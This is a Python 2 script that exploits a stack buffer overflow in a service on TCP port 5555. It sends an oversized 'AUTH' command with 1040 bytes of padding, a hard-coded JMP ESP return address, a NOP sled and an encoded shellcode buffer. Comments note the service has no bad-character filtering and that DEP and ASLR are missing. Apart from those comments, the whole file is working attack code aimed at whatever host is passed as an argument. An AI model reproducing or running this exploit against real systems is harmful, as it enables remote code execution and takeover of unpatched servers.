#!/usr/bin/python
import time, struct, sys
import socket as so

# The Application don't have a bad characters rejection.
# I also found that I only have one good JMP ESP pointer without DEP oR ASLR. [ 65D11D71 ]
buf =  b""
buf += b"\xba\x55\xf6\x01\xd3\xdb\xd7\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x96\xf2\xe3"
buf += b"\x26\xe4\x13\x61\xc8\x14\xe4\x06\x40\xf1\xd5\x06\x36"
buf += b"\x72\x45\xb7\x3c\xd6\x6a\x3c\x10\xc2\xf9\x30\xbd\xe5"
buf += b"\x4a\xfe\x9b\xc8\x4b\x53\xdf\x4b\xc8\xae\x0c\xab\xf1"
buf += b"\x60\x41\xaa\x36\x9c\xa8\xfe\xef\xea\x1f\xee\x84\xa7"
buf += b"\xa3\x85\xd7\x26\xa4\x7a\xaf\x49\x85\x2d\xbb\x13\x05"
buf += b"\xcc\x68\x28\x0c\xd6\x6d\x15\xc6\x6d\x45\xe1\xd9\xa7"
buf += b"\x97\x0a\x75\x86\x17\xf9\x87\xcf\x90\xe2\xfd\x39\xe3"
buf += b"\x9f\x05\xfe\x99\x7b\x83\xe4\x3a\x0f\x33\xc0\xbb\xdc"
buf += b"\xa2\x83\xb0\xa9\xa1\xcb\xd4\x2c\x65\x60\xe0\xa5\x88"
buf += b"\xa6\x60\xfd\xae\x62\x28\xa5\xcf\x33\x94\x08\xef\x23"
buf += b"\x77\xf4\x55\x28\x9a\xe1\xe7\x73\xf3\xc6\xc5\x8b\x03"
buf += b"\x41\x5d\xf8\x31\xce\xf5\x96\x79\x87\xd3\x61\x7d\xb2"
buf += b"\xa4\xfd\x80\x3d\xd5\xd4\x46\x69\x85\x4e\x6e\x12\x4e"
buf += b"\x8e\x8f\xc7\xc1\xde\x3f\xb8\xa1\x8e\xff\x68\x4a\xc4"
buf += b"\x0f\x56\x6a\xe7\xc5\xff\x01\x12\x8e\xf5\xde\x1c\x3c"
buf += b"\x62\xe3\x1c\xc1\xc9\x6a\xfa\xab\x3d\x3b\x55\x44\xa7"
buf += b"\x66\x2d\xf5\x28\xbd\x48\x35\xa2\x32\xad\xf8\x43\x3e"
buf += b"\xbd\x6d\xa4\x75\x9f\x38\xbb\xa3\xb7\xa7\x2e\x28\x47"
buf += b"\xa1\x52\xe7\x10\xe6\xa5\xfe\xf4\x1a\x9f\xa8\xea\xe6"
buf += b"\x79\x92\xae\x3c\xba\x1d\x2f\xb0\x86\x39\x3f\x0c\x06"
buf += b"\x06\x6b\xc0\x51\xd0\xc5\xa6\x0b\x92\xbf\x70\xe7\x7c"
buf += b"\x57\x04\xcb\xbe\x21\x09\x06\x49\xcd\xb8\xff\x0c\xf2"
buf += b"\x75\x68\x99\x8b\x6b\x08\x66\x46\x28\x38\x2d\xca\x19"
buf += b"\xd1\xe8\x9f\x1b\xbc\x0a\x4a\x5f\xb9\x88\x7e\x20\x3e"
buf += b"\x90\x0b\x25\x7a\x16\xe0\x57\x13\xf3\x06\xcb\x14\xd6"

# 65D11D71

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1040 + "\x71\x1D\xD1\x65" + "\x90" * 20 + buf + "B" * (1395-1040-4-20-351)
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
